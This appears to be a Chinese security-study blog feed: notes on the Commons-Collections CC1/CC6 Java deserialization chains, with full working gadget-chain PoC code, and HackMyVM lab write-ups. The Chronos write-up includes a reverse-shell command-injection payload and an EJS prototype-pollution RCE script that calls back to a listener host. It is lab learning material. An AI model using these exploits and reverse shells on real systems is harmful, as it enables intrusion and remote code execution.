&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最终所有理解</p>
<blockquote>
<ol>
<li>AnnotationInvocationHandler.readObject() <strong>反序列化触发</strong><br>  反序列化时，readObject() 方法被调用。<br>  在 readObject() 内部，它会调用 memberValues.entrySet()，其中 memberValues 实际上是 proxyMap。</li>
<li>memberValues.entrySet() <strong>-&gt;</strong> proxyMap.get(“entrySet”)<br>  由于 proxyMap 是 Proxy 代理对象，当调用 entrySet() 时，它会尝试调用 proxyMap.get(“entrySet”)。<br>  proxyMap.get(“entrySet”) 作为 Map 的方法，会被 InvocationHandler2 拦截。</li>
<li>InvocationHandler2.invoke() <strong>-&gt;</strong> proxyMap.get()<br>  InvocationHandler2 是 AnnotationInvocationHandler，它拦截 proxyMap.get(“entrySet”)。<br>  proxyMap 本身是一个 Proxy 对象，因此 get() 方法的调用会被再次拦截，进入 InvocationHandler1.invoke()。</li>
<li>InvocationHandler1.invoke() <strong>-&gt;</strong> decorateMap.get()<br>  InvocationHandler1 仍然是 AnnotationInvocationHandler，它调用 decorateMap.get() 来获取 entrySet。<br>  decorateMap 是 LazyMap，所以 get() 方法会被重写，并调用 factory.transform()。</li>
<li>LazyMap.get() <strong>-&gt;</strong> ChainedTransformer.transform()<br>  LazyMap 在 get() 方法中会调用 factory.transform()，这里 factory 是 ChainedTransformer，它会依次执行 transformers[] 数组中的转换逻辑。</li>
<li>ChainedTransformer <strong>执行</strong> Transformer[] <strong>变换</strong></li>
</ol>
</blockquote>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>感谢之前的师傅出的内容让我学习🙏</p>
<p><a class="link"   href="https://drun1baby.top/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/#0x03-Common-Collections-%E7%9B%B8%E5%85%B3%E4%BB%8B%E7%BB%8D" >https://drun1baby.top/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/#0x03-Common-Collections-%E7%9B%B8%E5%85%B3%E4%BB%8B%E7%BB%8D<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.bilibili.com/video/BV1no4y1U7E1?vd_source=46e5237289ae6c1a3c7bcab6091e42a6" >https://www.bilibili.com/video/BV1no4y1U7E1?vd_source=46e5237289ae6c1a3c7bcab6091e42a6<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <tags>
        <tag>java</tag>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>cc6学习笔记</title>
    <url>/2025/02/09/cc6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><ul>
<li><a class="link"   href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html" >Jdk 8u71<i class="fas fa-external-link-alt"></i></a></li>
<li>Comoons-Collections 3.2.1</li>
</ul>
<p>这次感觉CC6就等于CC1的lazyMap➕URLDNS，里面也有一些要注意的地方</p>
<h3 id="链条结构"><a href="#链条结构" class="headerlink" title="链条结构"></a>链条结构</h3><p>直接看yso给出来的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java.io.ObjectInputStream.readObject()</span><br><span class="line">            java.util.HashSet.readObject()</span><br><span class="line">                java.util.HashMap.put()</span><br><span class="line">                java.util.HashMap.hash()</span><br><span class="line">                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line">                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line">                        org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line">                            org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class="line">                            org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="line">                            java.lang.reflect.Method.invoke()</span><br><span class="line">                                java.lang.Runtime.exec()</span><br></pre></td></tr></table></figure>

<p>可以看到后半段其实很CC1的LazyMap是一样的，调用到get()，这次不同的是没有用<code>memberValues.entrySet()</code>去调用，而是找到<code>TiedMapEntry.getValue()</code></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250209164359.png" ></p>
<p>再进一步跟进，<code>TiedMapEntry.hashCode()</code>里面出现了<code>getValue</code>，巧了，前面URLDNS也用到了<code>hashCode</code></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250209164442.png" ></p>
<p>所以我们拼接一些就是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java.util.HashSet.readObject()</span><br><span class="line">	-&gt;HashMap.put()</span><br><span class="line">    -&gt; HashMap.hash(key)</span><br><span class="line">      -&gt; key.hashCode()</span><br><span class="line">        -&gt; TiedMapEntry.hashCode()</span><br><span class="line">          -&gt; TiedMapEntry.getValue()</span><br><span class="line">            -&gt; LazyMap.get()</span><br><span class="line">              ...</span><br><span class="line">						transform()</span><br></pre></td></tr></table></figure>

<p>思路还是非常清晰的</p>
<h3 id="Poc构成"><a href="#Poc构成" class="headerlink" title="Poc构成"></a>Poc构成</h3><p>一步一步来，先尝试直接调用<strong>TiedMapEntry</strong></p>
<p>首先<code>ChainedTransformer</code>和<code>LazyMap</code>是不变的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc6_test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">decorateMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(decorateMap, <span class="string">&quot;key&quot;</span>); <span class="comment">// 直接new一个对象</span></span><br><span class="line">        tiedMapEntry.getValue(); <span class="comment">// 直接去调用方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接调用执行<code>getValue</code>可以弹出计算机</p>
<p>再回退一步，这次我们直接用put去调用，在前面的代码后面这样改</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"><span class="type">Map</span> <span class="variable">decorateMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(decorateMap, <span class="string">&quot;key&quot;</span>);</span><br><span class="line">HashMap&lt;Object, Object&gt; expMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">expMap.put(tiedMapEntry,<span class="string">&quot;key&quot;</span>);</span><br><span class="line"></span><br><span class="line">serialize(expMap);</span><br><span class="line">unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>但是我们在调试后发现，在<strong>put</strong>()的时候就已经会弹计算机</p>
<p>这是因为<code>expMap</code>是HashMap型的，他自己在put的时候就会进入我们上文说过的链条，此时顺着下去<code>decorateMap</code>里面的内容就会被触发</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HashMap.put()-&gt; HashMap.hash(key)-&gt; key.hashCode()-&gt; TiedMapEntry.hashCode()-&gt; TiedMapEntry.getValue()-&gt;LazyMap.get()</span><br></pre></td></tr></table></figure>

<p>所以我们要控制put的时候里面的东西和我们那一串<code>chainedTransformer</code>无关，然后后面put完再改回来，保证<strong>只在反序列化</strong>的时候起作用。</p>
<p>同时，因为触发LazyMap里面transform()的主要影响属性是<u>factory</u>，它的作用域是<em>protected</em>，所以后面需要反射调用</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250211152636.png" ></p>
<p>还有一点就是<code>LazyMap.get()</code>里面进入<code>transform()</code>之后回再put一次，让key有值，后面反序列化再进入的时候会影响到if判断，所以我们在put之后需要把那个key给移走</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2025-02-11%2015.32.22.png" ></p>
<p>为了搞懂这个，我加了一些调试语句</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;进入if前 map &quot;</span> + map );</span><br><span class="line">        System.out.println(<span class="string">&quot;进入if前 key &quot;</span> + key);</span><br><span class="line">        System.out.println(<span class="string">&quot;进入if前 &quot;</span> + map.containsKey(key));</span><br><span class="line"><span class="comment">//         create value for key if key is not currently in the map</span></span><br><span class="line">        <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">            map.put(key, value);</span><br><span class="line">            System.out.println(<span class="string">&quot;进入if后 map &quot;</span> + map );</span><br><span class="line">            System.out.println(<span class="string">&quot;进入if后 key &quot;</span> + key);</span><br><span class="line">            System.out.println(<span class="string">&quot;进入if后 &quot;</span> + map.containsKey(key));</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>结果会打印</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">进入if前 map &#123;&#125;</span><br><span class="line">进入if前 key aaa</span><br><span class="line">进入if前 false</span><br><span class="line">进入if后 map &#123;aaa=1&#125;</span><br><span class="line">进入if后 key aaa</span><br><span class="line">进入if后 true</span><br></pre></td></tr></table></figure>

<p>所以我们需要在put后搞一个remove</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.out.println(<span class="string">&quot;1 &quot;</span> + decorateMap.containsKey(<span class="string">&quot;TiedKey&quot;</span>));</span><br><span class="line">expMap.put(tiedMapEntry,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;2 &quot;</span> + decorateMap.containsKey(<span class="string">&quot;TiedKey&quot;</span>));</span><br><span class="line">decorateMap.remove(<span class="string">&quot;TiedKey&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;3 &quot;</span> + decorateMap.containsKey(<span class="string">&quot;TiedKey&quot;</span>));</span><br></pre></td></tr></table></figure>

<p>结果打印</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 false</span><br><span class="line">2 true</span><br><span class="line">3 false</span><br></pre></td></tr></table></figure>

<p>综合上面这么多内容，最后的poc</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc6_test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 有一个decorateMap是LazyMap修饰过的</span></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object,Object&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">decorateMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 再套一层TiedMapEntry</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(decorateMap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; expMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        expMap.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        decorateMap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反射修改factory的值</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class; </span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(decorateMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        serialize(expMap);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>感谢各位前辈的分享</p>
<p>b站：白日梦组长</p>
<p><a class="link"   href="https://drun1baby.top/2022/06/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8703-CC6%E9%93%BE" >https://drun1baby.top/2022/06/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8703-CC6%E9%93%BE<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.cnblogs.com/CVE-Lemon/p/17935937.html" >https://www.cnblogs.com/CVE-Lemon/p/17935937.html<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <tags>
        <tag>java</tag>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>hackmyvm Chronos复盘</title>
    <url>/2024/06/21/hackmyvm-Chronos%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>一个考验细心的靶场，我还挺被卡的，也是给我一个教训，写复盘主要是记录回顾，做出来主要还是参考了大佬的wp，写完wp还是意识到自己基础太弱，希望暑假能静下心好好补基础</p>
<p>主要参考：</p>
<p><a class="link"   href="https://al1enum.github.io/docs/Chronos.pdf" >https://al1enum.github.io/docs/Chronos.pdf<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.bilibili.com/video/BV15o4y1z73N/?vd_source=04ff153ff0b36e8676b4638902ed9f4b" >https://www.bilibili.com/video/BV15o4y1z73N/?vd_source=04ff153ff0b36e8676b4638902ed9f4b<i class="fas fa-external-link-alt"></i></a> （讲的很细，推荐）</p>
<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>前期看到开了22，80，8000端口，先看80和8000</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240621174335.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240621174353.png" ></p>
<p>最开始拿到两个网页，内容差不多，查看源代码也没看到什么新东西，扫了很久目录扫到一个&#x2F;date，访问之后是一些报错，暂时对我没什么帮助，这个时候我就被卡住了。。。。</p>
<p>然后我就看了wp提示，要观察访问网站的请求包</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240621174604.png" ></p>
<p>可以看到这里有个域名，要编辑一下&#x2F;etc&#x2F;hosts了，再访问</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240621174835.png" ></p>
<p>主要到&#x2F;data?format&#x3D;有一段内容，尝试拿去解码</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240621174930.png" ></p>
<p>base58解码后发现这是一个显示时间的命令，至于为什么会Permission Denied，经过研究，发现是请求包的缺少了特定的ua头（正常抓包能发现是有的）<strong>（后来发现网站源码有一段被混淆的代码，解混淆后也能知道要求有特定ua头才能执行代码）</strong></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240621175416.png" ></p>
<p>于是加上之后才能正确看到时间</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240621175458.png"   style="zoom:50%;" >

<h4 id="功能点利用"><a href="#功能点利用" class="headerlink" title="功能点利用"></a>功能点利用</h4><p>知道有这个功能点，可以尝试命令注入，format参数接收命令，于是尝试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;bash -c &#x27;/bin/bash -i &gt;&amp; /dev/tcp/192.168.64.3/8888 0&gt;&amp;1&#x27;</span><br><span class="line">base58编码：YLAX9KhLnbeXJEfvdxJCU6qbixB1RzHhWDZ87VijVMTAtiYpjwpV2jJXtqZBGQg1uLKckNVQHium3Ca</span><br></pre></td></tr></table></figure>

<p>成功反弹到shell</p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>看了一下靶机开放的端口</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240623102311.png" ></p>
<p>发现内网还开了一个8080端口，curl一下</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240623105206.png" ></p>
<p>发现有Chronos version2，回到上一级目录，有一个chronos-v2，看一下代码</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240623105320.png" ></p>
<p>ejs库使用<code>express-fileupload</code>来处理文件上传，有一个利用原型链污染的poc（还不是很懂原理）可以直接用</p>
<p><a class="link"   href="https://github.com/boiledsteak/EJS-Exploit/blob/main/attacker/EJS-RCE-attack.py" >https://github.com/boiledsteak/EJS-Exploit/blob/main/attacker/EJS-RCE-attack.py<i class="fas fa-external-link-alt"></i></a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">### commands to run on victim machine</span><br><span class="line">cmd = &#x27;bash -c &quot;bash -i &amp;&gt; /dev/tcp/192.168.64.3/1234 0&gt;&amp;1&quot;&#x27;</span><br><span class="line"></span><br><span class="line">print(&quot;Starting Attack...&quot;)</span><br><span class="line">### pollute</span><br><span class="line">requests.post(&#x27;http://127.0.0.1:8080&#x27;, files = &#123;&#x27;__proto__.outputFunctionName&#x27;: (</span><br><span class="line">    None, f&quot;x;console.log(1);process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;&#123;cmd&#125;&#x27;);x&quot;)&#125;)</span><br><span class="line"></span><br><span class="line">### execute command</span><br><span class="line">requests.get(&#x27;http://127.0.0.1:8080&#x27;)</span><br><span class="line">print(&quot;Finished!&quot;)</span><br></pre></td></tr></table></figure>

<p>执行这个poc就能得到imera的shell</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240623110405.png" ></p>
<p>然后sudo -l就能看到有node和npm可以用</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240623110430.png" ></p>
<p>直接gtfobins利用node一把梭，提权成功，结束</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240623110532.png" ></p>
]]></content>
      <tags>
        <tag>复盘</tag>
      </tags>
  </entry>
  <entry>
    <title>hackmyvm Colors复盘</title>
    <url>/2024/03/20/hackmyvm-Colors%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>这个靶场涉及的知识点比较多，思路是大部分学习其他师傅的wp的，写复盘是想记录思路顺便回顾学好每个知识点。</p>
<h4 id="启动前准备"><a href="#启动前准备" class="headerlink" title="启动前准备"></a>启动前准备</h4><p>由于<strong>网卡配置不同</strong>，我每次都需要开靶机刚开启的时候shift+e进入grub编辑，给一个root的&#x2F;bin&#x2F;bash启动编辑一下&#x2F;etc&#x2F;netwrok&#x2F;interfaces里面的网卡配置，这是前置背景。</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320144812.png" ></p>
<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址：<a class="link"   href="https://hackmyvm.eu/machines/machine.php?vm=Colors" >https://hackmyvm.eu/machines/machine.php?vm=Colors<i class="fas fa-external-link-alt"></i></a></p>
<p>难度：medium</p>
<p>ip：192.168.64.92</p>
<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>nmap扫到21、22、80端口，并且22端口被过滤了（注意这里要用root扫如果用普通用户扫扫不到22端口信息）</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320154203.png" ></p>
<p>先访问80端口</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320154338.png" ></p>
<p>只有一张图片，扫目录一无所获，也对图片分析不出什么内容</p>
<p>看看21号端口</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320154455.png" ></p>
<p>看起来可以用anonymous登陆，登陆一下</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320154607.png" ></p>
<p>把secret.jpg下载下来，使用stegseek分析一波</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320155012.png" ></p>
<p>搞出来一段字符，在cyberchef分析，是base85</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320155123.png" ></p>
<p>得到一个pink的账号密码，这个时候我的思路是去登陆22端口，但是它的端口filted，后来去看了wp才知道这里有一个端口敲门，ftp那里就给了提示（好神奇的点子）</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-20%2015.54.39.png" ></p>
<p>1127，1039，1081分别对应first，second，third敲门顺序，按顺序敲门端口才会打开，类似情况之前做vuln的DC系列的靶机也遇到过。</p>
